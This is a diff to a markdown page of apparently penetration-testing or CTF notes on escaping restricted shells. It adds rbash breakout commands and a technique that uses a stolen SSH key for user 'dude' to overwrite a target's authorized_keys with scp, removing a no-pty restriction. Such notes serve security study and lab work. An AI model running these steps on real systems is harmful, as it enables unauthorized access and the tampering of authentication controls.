@@ -17,11 +17,24 @@ nav_order: 4-2
 <br/>
 #### Restrictive Shell
 If you have access to the <i>echo</i> command it is possible to use the built-in API to break out:
-``` echo os.system("/bin/bash")```
+<br />
+```echo os.system("/bin/bash")```
+<br />
 Break out of <b> RBash </b>:
-``` ssh restricted@$IP -p 31678 -t "bash --noprofile" ```
-OR
-```ssh user@$IP "/bin/sh"```
+``` ssh restricted@$IP -p 31678 -t "bash --noprofile"
+OR 
+ssh user@$IP "/bin/sh"```
+
+<br />
+#### SSH Access Denied - pty restricted
+- If you can read the 'authorized_keys' file, you may see there is a 'no-pty' option
+- We may be able to replace this file if we have an SSH key for the target user using <b>scp</b> with a public key. 
+Copy the authorised key, remove the 'no-pty' option  and then place it back on the target, overwriting the blocking file
+``` scp -i id_rsa authorized_keys dude@192.168.150.150:.ssh/authorized_keys ```
+> This uses an id_rsa key we have previously obtained for a user called 'dude' and replaces authorized_keys with our modified file
+Note: If you are not allowed to produce output on the target, use the -O flag
+``` scp -O  -i id_rsa authorized_keys dude@192.168.150.150:.ssh/authorized_keys ```
+
 
 <br />
 #### Check the following locations for private keys:
